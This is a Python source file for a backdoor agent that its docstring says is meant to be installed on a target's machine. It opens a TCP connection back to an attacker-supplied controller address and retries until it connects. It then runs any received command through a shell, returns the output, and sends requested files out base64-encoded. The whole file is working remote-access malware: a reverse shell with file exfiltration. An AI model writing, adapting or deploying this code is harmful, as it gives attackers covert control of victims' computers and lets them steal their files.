
import socket
import optparse
import sys
import subprocess
import json
import os
import base64
import time

"""
    This code is for agent which can be installed into the target's machine. The code can act as backdoor which can get the command from controller 
    or hacker and reply back the results to the controller.
"""

class MyTCPClient:
    def __init__(self) -> None:
        """
            target: IP address of controller or hacker
            port: port which can be used to connect to 
        """

        self.target = self.get_param()[0]
        self.port = self.get_param()[1]
        try:
            self.client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            while True:
                try:
                    self.client_socket.connect((self.target, self.port))
                    break
                except:
                    time.sleep(2)


        except Exception as e:
            print("[-] Failed to connect to target: %s" % e)
            sys.exit()


    def get_param(self):
        parser = optparse.OptionParser('./%s -t target ip address -p port' % sys.argv[0])
        parser.add_option('-t', '--target',  dest='target', type='string', help='Specify IP addresss to connect to')
        parser.add_option('-p', '--port', dest='port', type='int', help='Specify port number')
        options, args = parser.parse_args()
        if options.target is None or options.port is None:
            print(parser.usage)
            sys.exit()
        return options.target, options.port
    
    def reliable_send(self,data):
        """
            convert to JSON data before sending to the destination
        """

        self.client_socket.send(json.dumps(data).encode('utf-8'))
    
    def reliable_recv(self):
        data = ""
        while True:
            try:
                recv_data = self.client_socket.recv(1024)
                data = data + recv_data.decode('utf-8')
                return json.loads(data)
                """
                Try to convert back to the orgininal data, catch the eror when the received data is incomplete and contitue to receive data from peer
                """

            except ValueError:
                continue
    
    def download_file(self,file_path):
                
        if not os.path.exists(file_path):
            """
            If the requested file is not existent on the agent's computer, then reply back the result of 'no file'
            """
            res = 'no file'
            self.reliable_send(res)

        else:      
            with open(file_path, 'rb') as f:
                """
                Very important to decode bytes data before sending to the peer, otherwise the controller can't get the file properly
                """
                send_data = base64.b64encode(f.read()).decode('ascii')
                self.reliable_send(send_data)

    def run(self):
        while True:
            # command = self.client_socket.recv(1024).decode('utf-8')
            command = self.reliable_recv()
            res = ""
            print(command)
            if command == 'q':
                break
            if command == '':
                continue
            if command.startswith('cd'):
                cd_path = command.split()[1]
                if not os.path.exists(cd_path):
                    res = 'No such directory to navigate'
                    self.reliable_send(res)
                     
                    continue
                
                else:
                    os.chdir(cd_path)
                    res = 'Changed successfully'
                    self.reliable_send(res)
                    continue    
            if command.startswith('download'):
                print("Begin to download")
                file_path = command.split()[1]
                self.download_file(file_path)
                continue
            try:
                result = subprocess.run(command, shell=True, capture_output=True)
                if len(result.stderr) == 0:
                    res = result.stdout.decode('utf-8')
                else:
                    res = result.stderr.decode('utf-8')
                
            except Exception as e:
                res = 'Failed to execute command'
                print('Failed to execute: %s' % e)
                
            
            print(res)
        
            # self.client_socket.send(res)
            self.reliable_send(res)
        self.client_socket.close()

if __name__ == '__main__':
    client = MyTCPClient()
    client.run()
